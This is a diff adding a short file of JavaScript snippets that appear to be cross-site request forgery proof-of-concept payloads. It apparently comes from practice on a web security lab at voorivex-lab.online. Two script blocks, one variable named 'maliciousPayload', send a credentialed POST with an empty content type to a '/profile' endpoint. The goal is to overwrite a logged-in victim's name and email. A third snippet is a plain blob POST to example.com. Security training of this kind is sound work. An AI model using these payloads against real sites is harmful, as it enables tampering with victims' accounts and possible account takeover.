@@ -1,0 +1,39 @@
+
+    <script>
+        const maliciousPayload = JSON.stringify({
+         name : "mamad hacker",
+         email: "goooraz@example.com",
+        });
+        const blob = new Blob([maliciousPayload], { type: "" });
+        fetch("https://id.voorivex-lab.online/profile", {
+          method: "POST", 
+          body: blob,
+          credentials: "include", 
+        })
+    </script>
+ --------------------------------------------------------------------------------------------------------------------------------------------
+   	<script>
+          // Create JSON values
+      const jsonData = JSON.stringify({ name: "souren", email: "goooraz@gmail.com" });
+
+      // Create Blob
+      const blob = new Blob([jsonData], { type: "" });
+
+      // Send request with XMLHttpRequest
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://r7n0lbtjgp.voorivex-lab.online/profile", true);
+      xhr.onreadystatechange = function () {
+        if (xhr.status >= 200 && xhr.status < 300) {
+          console.log("Response:");
+        } 
+      };
+      xhr.withCredentials= true;
+      xhr.send(blob);
+    </script>
+   --------------------------------------------------------------------------------------------------------------------------------------------
+   const blob = new Blob(['Hello, world!']);
+
+fetch('https://example.com', {
+    method: 'POST',
+    body: blob
+});
